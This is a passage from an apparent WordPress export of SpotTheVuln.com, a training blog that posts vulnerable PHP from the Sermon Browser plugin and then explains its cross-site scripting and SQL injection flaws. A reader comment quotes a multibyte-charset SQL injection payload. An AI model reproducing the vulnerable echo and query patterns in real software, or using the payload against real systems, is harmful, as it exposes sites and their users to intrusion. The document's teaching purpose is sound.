'507' =&gt; array('Insufficient Storage','The method could not be performed on the resource because the server is unable to store the representation needed to successfully complete the request. There is insufficient free space left in your storage allocation.'),
'510' =&gt; array('Not Extended', 'A mandatory extension policy in the request is not accepted by the server for this resource.')
);

if (isset($_SERVER['REDIRECT_STATUS'])) $err_code = $_SERVER['REDIRECT_STATUS'];

$err_req_meth = $_SERVER['REQUEST_METHOD'];
$err_req = htmlentities(strip_tags($_SERVER['REQUEST_URI']));
$err_phrase = $err_status_codes[$err_code][0];
$err_body = str_replace(
 array('INTERROR', 'THEREQUESTURI', 'THEREQMETH'),
 array('The server encountered an internal error or misconfiguration and was unable to complete your request.',$err_req, $err_req_meth),$err_status_codes[$err_code][1]);

@header(&quot;HTTP/1.1 $err_code $err_phrase&quot;, 1);
@header(&quot;Status: $err_code $err_phrase&quot;, 1);

if ( $err_code=='400'||$err_code=='403'||$err_code=='405'||$err_code[0]=='5'){
 @header(&quot;Connection: close&quot;, 1);
 if ($err_code == '405') @header('Allow: GET,HEAD,POST,OPTIONS,TRACE');
 echo &quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//IETF//DTD HTML 2.0//EN\&quot;&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;{$err_code} {$err_phrase}&lt;/title&gt;\n&lt;h1&gt;{$err_phrase}&lt;/h1&gt;\n&lt;p&gt;{$err_body}&lt;br&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;&quot;;
} else echo '&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;
       &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;title&gt;'.$err_code.' '.$err_phrase.'&lt;/title&gt;
  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;'.$err_code.' '.$err_phrase.'&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;
'.$err_body.'&lt;br /&gt;
&lt;/p&gt;
-&lt;pre&gt;
-'.print_r($_SERVER,1).'
-&lt;/pre&gt;
  &lt;/body&gt;
&lt;/html&gt;';
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1435</wp:post_id>
		<wp:post_date>2011-04-29 05:30:15</wp:post_date>
		<wp:post_date_gmt>2011-04-29 12:30:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bases-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Percentage</title>
		<link>http://spotthevuln.com/2011/05/percentage/</link>
		<pubDate>Mon, 02 May 2011 12:30:59 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1439</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>100 per cent of us die, and the percentage cannot be increased.
C.S. Lewis</strong></blockquote>
[sourcecode language="php"]
&lt;?php
...snip...
} elseif (isset($_POST['fetch'])) { // ajax pagination
	if (function_exists('wp_timezone_override_offset'))
		wp_timezone_override_offset();
	$st = (int) $_POST['fetch'] - 1;
	if (!empty($_POST['title'])) {
		$cond = &quot;and m.title LIKE '%&quot; . mysql_real_escape_string($_POST['title']) . &quot;%' &quot;;
	} else
		$cond = '';
	if ($_POST['preacher'] != 0) {
		$cond .= 'and m.preacher_id = ' . (int) $_POST['preacher'] . ' ';
	}
	if ($_POST['series'] != 0) {
		$cond .= 'and m.series_id = ' . (int) $_POST['series'] . ' ';
	}
	$m = $wpdb-&gt;get_results(&quot;SELECT SQL_CALC_FOUND_ROWS m.id, m.title, m.datetime, p.name as pname, s.name as sname, ss.name as ssname
	FROM {$wpdb-&gt;prefix}sb_sermons as m
	LEFT JOIN {$wpdb-&gt;prefix}sb_preachers as p ON m.preacher_id = p.id
	LEFT JOIN {$wpdb-&gt;prefix}sb_services as s ON m.service_id = s.id
	LEFT JOIN {$wpdb-&gt;prefix}sb_series as ss ON m.series_id = ss.id
	WHERE 1=1 {$cond}
	ORDER BY m.datetime desc, s.time desc LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));

	$cnt = $wpdb-&gt;get_var(&quot;SELECT FOUND_ROWS()&quot;);
	?&gt;
	&lt;?php foreach ($m as $sermon): ?&gt;
		&lt;tr class=&quot;&lt;?php echo ++$i % 2 == 0 ? 'alternate' : '' ?&gt;&quot;&gt;
			&lt;th style=&quot;text-align:center&quot; scope=&quot;row&quot;&gt;&lt;?php echo $sermon-&gt;id ?&gt;&lt;/th&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;title) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;pname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo ($sermon-&gt;datetime == '1970-01-01 00:00:00') ? __('Unknown', $sermon_domain) : strftime('%d %b %y', strtotime($sermon-&gt;datetime)); ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;sname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;ssname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo sb_sermon_stats($sermon-&gt;id) ?&gt;&lt;/td&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;
				&lt;a href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/new_sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Edit', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;a onclick=&quot;return confirm('Are you sure?')&quot; href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Delete', $sermon_domain) ?&gt;&lt;/a&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;?php endforeach ?&gt;
	&lt;script type=&quot;text/javascript&quot;&gt;
	&lt;?php if($cnt&lt;sb_get_option('sermons_per_page') || $cnt &lt;= $st+sb_get_option('sermons_per_page')): ?&gt;
		jQuery('#right').css('display','none');
	&lt;?php elseif($cnt &gt; $st+sb_get_option('sermons_per_page')): ?&gt;
		jQuery('#right').css('display','');
	&lt;?php endif ?&gt;
	&lt;/script&gt;
	&lt;?php
} elseif (isset($_POST['fetchU']) || isset($_POST['fetchL']) || isset($_POST['search'])) { // ajax pagination (uploads)
	if (isset($_POST['fetchU'])) {
		$st = (int) $_POST['fetchU'] - 1;
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.sermon_id = 0 AND f.type = 'file' ORDER BY f.name LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));
	} elseif (isset($_POST['fetchL'])) {
		$st = (int) $_POST['fetchL'] - 1;
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.sermon_id &lt;&gt; 0 AND f.type = 'file' ORDER BY f.name LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));
	} else {
		$s = mysql_real_escape_string($_POST['search']);
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.name LIKE '%{$s}%' AND f.type = 'file' ORDER BY f.name;&quot;);
	}
?&gt;
&lt;?php if (count($abc) &gt;= 1): ?&gt;
	&lt;?php foreach ($abc as $file): ?&gt;
		&lt;tr class=&quot;file &lt;?php echo (++$i % 2 == 0) ? 'alternate' : '' ?&gt;&quot; id=&quot;&lt;?php echo $_POST['fetchU'] ? '' : 's' ?&gt;file&lt;?php echo $file-&gt;id ?&gt;&quot;&gt;
			&lt;th style=&quot;text-align:center&quot; scope=&quot;row&quot;&gt;&lt;?php echo $file-&gt;id ?&gt;&lt;/th&gt;
			&lt;td id=&quot;&lt;?php echo $_POST['fetchU'] ? '' : 's' ?&gt;&lt;?php echo $file-&gt;id ?&gt;&quot;&gt;&lt;?php echo substr($file-&gt;name, 0, strrpos($file-&gt;name, '.')) ?&gt;&lt;/td&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;&lt;?php echo isset($filetypes[substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)]['name']) ? $filetypes[substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)]['name'] : strtoupper(substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)) ?&gt;&lt;/td&gt;
			&lt;?php if (!isset($_POST['fetchU'])) { ?&gt;&lt;td&gt;&lt;?php echo stripslashes($file-&gt;title) ?&gt;&lt;/td&gt;&lt;?php } ?&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;
				&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;
				function deletelinked_&lt;?php echo $file-&gt;id;?&gt;(filename, filesermon) {
					if (confirm('Do you really want to delete '+filename+'?')) {
						if (filesermon != '') {
							return confirm('This file is linked to the sermon called ['+filesermon+']. Are you sure you want to delete it?');
						}
						return true;
					}
					return false;
				}
				&lt;/script&gt;
				&lt;?php if (isset($_POST['fetchU'])) { ?&gt;&lt;a id=&quot;&quot; href=&quot;&lt;?php echo $_SERVER['PHP_SELF'].&quot;?page=sermon-browser/new_sermon.php&amp;amp;getid3={$file-&gt;id}&quot;; ?&gt;&quot;&gt;&lt;?php _e('Create sermon', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;?php } ?&gt;
				&lt;a id=&quot;link&lt;?php echo $file-&gt;id ?&gt;&quot; href=&quot;javascript:rename(&lt;?php echo $file-&gt;id ?&gt;, '&lt;?php echo $file-&gt;name ?&gt;')&quot;&gt;&lt;?php _e('Rename', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;a onclick=&quot;return deletelinked_&lt;?php echo $file-&gt;id;?&gt;('&lt;?php echo str_replace(&quot;'&quot;, '', $file-&gt;name) ?&gt;', '&lt;?php echo str_replace(&quot;'&quot;, '', $file-&gt;title) ?&gt;');&quot; href=&quot;javascript:kill(&lt;?php echo $file-&gt;id ?&gt;, '&lt;?php echo $file-&gt;name ?&gt;');&quot;&gt;&lt;?php _e('Delete', $sermon_domain) ?&gt;&lt;/a&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;?php endforeach ?&gt;
&lt;?php else: ?&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;?php _e('No results', $sermon_domain) ?&gt;&lt;/td&gt;
	&lt;/tr&gt;
&lt;?php endif ?&gt;
&lt;?php
}
die();

?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1439</wp:post_id>
		<wp:post_date>2011-05-02 05:30:59</wp:post_date>
		<wp:post_date_gmt>2011-05-02 12:30:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>percentage</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2056</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/05/percentage-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-05-06 05:35:36</wp:comment_date>
			<wp:comment_date_gmt>2011-05-06 12:35:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Percentage [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1304685336.402";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304697761.1959";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2052</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-05-05 23:58:36</wp:comment_date>
			<wp:comment_date_gmt>2011-05-06 06:58:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I see two possible problems here:

1.  XSS in $_SERVER['PHP_SELF'] as explained in 

http://www.mc2design.com/blog/php_self-safe-alternatives

2.  Possible SQL injection if the code can output and store different character sets (notably GBK simplified chinese).  Don't have all of the source code but there is a known problem with certain multi-byte character sets (GBK-simplified chinese for one) and mysql_real_escape_string().

According to http://bugs.mysql.com/bug.php?id=8378

==================================================
[9 Feb 2005 14:47] John Percival 

I think that this is probably quite a major issue. Take for example, the following SQL
query:

SELECT * FROM user WHERE username = '¿\' OR userid = 1 -- '

That could easily be produced by:
$username="¿' OR userid = 1 -- ";
mysql_query("SELECT * FROM USER WHERE username = _latin1'" .
mysql_real_escape_string($username) . "'");

What I'm saying is that this bug opens the door to SQL injection attacks, when running in
GBK and some other multi-byte charsets.

I have posted this comment in bugs #8317 and #8378 as I think that it's pertinent to
both: mysql_real_escape_string() needs to throw an error if it can't properly escape the
string in the current charset; the parser needs to be able to use the _latin1 introducer
to determine how it parses the following literal string.

==================================================

What it boils down to is that PHP is running under a character set which does not understand multibyte character sets or the version of PHP does not understand multibyte character sets.  When mysql_real_escape_string() looks at the incoming string it see two characters (an unknown character and single quote).  Because it sees single quote it replaces single quote with \' (backslash single quote).  The problem occurs when the string is passed to the database and parsed using the character set of the database (in this case GBK).  The the GBK character set the unknown character and backslash combine into a multibyte character and the single quote escaping (prepended backslash) is removed.

So an attacker supplies:

¿' OR userid = 1 -- ";

and what is returned from mysql_real_escape_string():

¿\' OR userid = 1 -- ";

When the SQL string is passed to the data base the query becomes:

(new single char which was a combination of ¿ and \)' OR userid = 1 -- ";

This allows a single quote to be passed to the database unescaped.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304697758.5413";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304665116.0634";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Percentage - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/05/percentage-cross-site-scripting/</link>
		<pubDate>Fri, 06 May 2011 12:30:39 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1443</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Sermon Browser Wordpress Plugin

Fixed in Version: .44

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/05/percentage/">Found Here</a>
<h1>Details</h1>
There is a lot going on here in this code snippet.   First, let’s talk about the patch.  The patch adds a check to ensure the user requesting has the rights to edit a post.  The added functionality only displays a link (A HREF) if the user has the correct permissions.  Let’s hope there are additional checks in place to prevent the execution of this functionality, as opposed to just trying to obscure the link.
<br><br>
Second, there are a few SQL queries.  The SQL queries actually seem to be well handled; most values are cast to int, which should work.  Of course, Neal Poole and Jacob astutely point out that casts to int cannot always be trusted (<a href="http://spotthevuln.com/2011/03/invincible-cross-site-scripting/">http://spotthevuln.com/2011/03/invincible-cross-site-scripting/</a> &lt;-- see comments section).  Abraham Kang also points out that some escaping functions can be defeated by using alternate charsets.  The better solution is to use parameterized queries.
<br><br>
What about XSS?  There is XSS everywhere on this page.  In fact, there is so much XSS I’m not even going to try to list all of the exposures.  Instead, I’ll focus on two different patterns.  Let’s start with a classic XSS bug seen in many different PHP products.  On line XX, the developer echoes back $_SERVER[‘PHP_SELF’].  This results in XSS.  Many developers think that PHP_SELF will only echo back the current URL path with no user controlled input, but sadly this is not the case.  PHP_SELF can almost always be tainted by a user/attacker.  This comment on the reserved variables page for PHP sums it up nicely: <a href="http://www.php.net/manual/en/reserved.variables.php#55068">http://www.php.net/manual/en/reserved.variables.php#55068</a>.
<br><br>
Now, looking at lines 30-35, we see the developer uses stripslashes before echoing back a user controlled value.  I’m guessing this is because the developer was worried about echoing back data that was stored with a database escaping function.   Unfortunately, stripslashes does not prevent XSS.  Pretty much all of the echo statements on this page are vulnerable to XSS (unless the data is being stored  in an HTML encoded state).  The echo statements on line 68 and line 70 are 100% XSS.
<br><br>
From the looks of this code, it’s likely the developer doesn't know what XSS is.  Any security training should probably first focus on this deficiency.  Other code written by this developer should also be audited for XSS.


<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="37-42,68,70"]
&lt;?php
...snip...
} elseif (isset($_POST['fetch'])) { // ajax pagination
	if (function_exists('wp_timezone_override_offset'))
		wp_timezone_override_offset();
	$st = (int) $_POST['fetch'] - 1;
	if (!empty($_POST['title'])) {
		$cond = &quot;and m.title LIKE '%&quot; . mysql_real_escape_string($_POST['title']) . &quot;%' &quot;;
	} else
		$cond = '';
	if ($_POST['preacher'] != 0) {
		$cond .= 'and m.preacher_id = ' . (int) $_POST['preacher'] . ' ';
	}
	if ($_POST['series'] != 0) {
		$cond .= 'and m.series_id = ' . (int) $_POST['series'] . ' ';
	}
	$m = $wpdb-&gt;get_results(&quot;SELECT SQL_CALC_FOUND_ROWS m.id, m.title, m.datetime, p.name as pname, s.name as sname, ss.name as ssname
	FROM {$wpdb-&gt;prefix}sb_sermons as m
	LEFT JOIN {$wpdb-&gt;prefix}sb_preachers as p ON m.preacher_id = p.id
	LEFT JOIN {$wpdb-&gt;prefix}sb_services as s ON m.service_id = s.id
	LEFT JOIN {$wpdb-&gt;prefix}sb_series as ss ON m.series_id = ss.id
	WHERE 1=1 {$cond}
	ORDER BY m.datetime desc, s.time desc LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));

	$cnt = $wpdb-&gt;get_var(&quot;SELECT FOUND_ROWS()&quot;);
	?&gt;
	&lt;?php foreach ($m as $sermon): ?&gt;
		&lt;tr class=&quot;&lt;?php echo ++$i % 2 == 0 ? 'alternate' : '' ?&gt;&quot;&gt;
			&lt;th style=&quot;text-align:center&quot; scope=&quot;row&quot;&gt;&lt;?php echo $sermon-&gt;id ?&gt;&lt;/th&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;title) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;pname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo ($sermon-&gt;datetime == '1970-01-01 00:00:00') ? __('Unknown', $sermon_domain) : strftime('%d %b %y', strtotime($sermon-&gt;datetime)); ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;sname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo stripslashes($sermon-&gt;ssname) ?&gt;&lt;/td&gt;
			&lt;td&gt;&lt;?php echo sb_sermon_stats($sermon-&gt;id) ?&gt;&lt;/td&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;
-				&lt;a href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/new_sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Edit', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;a onclick=&quot;return confirm('Are you sure?')&quot; href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Delete', $sermon_domain) ?&gt;&lt;/a&gt;
+				&lt;?php //Security check 
+							if (current_user_can('edit_posts')) { ?&gt; 
+							&lt;a href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/new_sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Edit', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;a onclick=&quot;return confirm('Are you sure?')&quot; href=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=sermon-browser/sermon.php&amp;mid=&lt;?php echo $sermon-&gt;id ?&gt;&quot;&gt;&lt;?php _e('Delete', $sermon_domain); ?&gt;&lt;/a&gt; | 
+				&lt;?php } ?&gt; 
+				&lt;a href=&quot;&lt;?php echo sb_display_url().sb_query_char(true).'sermon_id='.$sermon-&gt;id;?&gt;&quot;&gt;View&lt;/a&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;?php endforeach ?&gt;
	&lt;script type=&quot;text/javascript&quot;&gt;
	&lt;?php if($cnt&lt;sb_get_option('sermons_per_page') || $cnt &lt;= $st+sb_get_option('sermons_per_page')): ?&gt;
		jQuery('#right').css('display','none');
	&lt;?php elseif($cnt &gt; $st+sb_get_option('sermons_per_page')): ?&gt;
		jQuery('#right').css('display','');
	&lt;?php endif ?&gt;
	&lt;/script&gt;
	&lt;?php
} elseif (isset($_POST['fetchU']) || isset($_POST['fetchL']) || isset($_POST['search'])) { // ajax pagination (uploads)
	if (isset($_POST['fetchU'])) {
		$st = (int) $_POST['fetchU'] - 1;
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.sermon_id = 0 AND f.type = 'file' ORDER BY f.name LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));
	} elseif (isset($_POST['fetchL'])) {
		$st = (int) $_POST['fetchL'] - 1;
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.sermon_id &lt;&gt; 0 AND f.type = 'file' ORDER BY f.name LIMIT {$st}, &quot;.sb_get_option('sermons_per_page'));
	} else {
		$s = mysql_real_escape_string($_POST['search']);
		$abc = $wpdb-&gt;get_results(&quot;SELECT f.*, s.title FROM {$wpdb-&gt;prefix}sb_stuff AS f LEFT JOIN {$wpdb-&gt;prefix}sb_sermons AS s ON f.sermon_id = s.id WHERE f.name LIKE '%{$s}%' AND f.type = 'file' ORDER BY f.name;&quot;);
	}
?&gt;
&lt;?php if (count($abc) &gt;= 1): ?&gt;
	&lt;?php foreach ($abc as $file): ?&gt;
		&lt;tr class=&quot;file &lt;?php echo (++$i % 2 == 0) ? 'alternate' : '' ?&gt;&quot; id=&quot;&lt;?php echo $_POST['fetchU'] ? '' : 's' ?&gt;file&lt;?php echo $file-&gt;id ?&gt;&quot;&gt;
			&lt;th style=&quot;text-align:center&quot; scope=&quot;row&quot;&gt;&lt;?php echo $file-&gt;id ?&gt;&lt;/th&gt;
			&lt;td id=&quot;&lt;?php echo $_POST['fetchU'] ? '' : 's' ?&gt;&lt;?php echo $file-&gt;id ?&gt;&quot;&gt;&lt;?php echo substr($file-&gt;name, 0, strrpos($file-&gt;name, '.')) ?&gt;&lt;/td&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;&lt;?php echo isset($filetypes[substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)]['name']) ? $filetypes[substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)]['name'] : strtoupper(substr($file-&gt;name, strrpos($file-&gt;name, '.') + 1)) ?&gt;&lt;/td&gt;
			&lt;?php if (!isset($_POST['fetchU'])) { ?&gt;&lt;td&gt;&lt;?php echo stripslashes($file-&gt;title) ?&gt;&lt;/td&gt;&lt;?php } ?&gt;
			&lt;td style=&quot;text-align:center&quot;&gt;
				&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;
				function deletelinked_&lt;?php echo $file-&gt;id;?&gt;(filename, filesermon) {
					if (confirm('Do you really want to delete '+filename+'?')) {
						if (filesermon != '') {
							return confirm('This file is linked to the sermon called ['+filesermon+']. Are you sure you want to delete it?');
						}
						return true;
					}
					return false;
				}
				&lt;/script&gt;
				&lt;?php if (isset($_POST['fetchU'])) { ?&gt;&lt;a id=&quot;&quot; href=&quot;&lt;?php echo $_SERVER['PHP_SELF'].&quot;?page=sermon-browser/new_sermon.php&amp;amp;getid3={$file-&gt;id}&quot;; ?&gt;&quot;&gt;&lt;?php _e('Create sermon', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;?php } ?&gt;
				&lt;a id=&quot;link&lt;?php echo $file-&gt;id ?&gt;&quot; href=&quot;javascript:rename(&lt;?php echo $file-&gt;id ?&gt;, '&lt;?php echo $file-&gt;name ?&gt;')&quot;&gt;&lt;?php _e('Rename', $sermon_domain) ?&gt;&lt;/a&gt; | &lt;a onclick=&quot;return deletelinked_&lt;?php echo $file-&gt;id;?&gt;('&lt;?php echo str_replace(&quot;'&quot;, '', $file-&gt;name) ?&gt;', '&lt;?php echo str_replace(&quot;'&quot;, '', $file-&gt;title) ?&gt;');&quot; href=&quot;javascript:kill(&lt;?php echo $file-&gt;id ?&gt;, '&lt;?php echo $file-&gt;name ?&gt;');&quot;&gt;&lt;?php _e('Delete', $sermon_domain) ?&gt;&lt;/a&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;?php endforeach ?&gt;
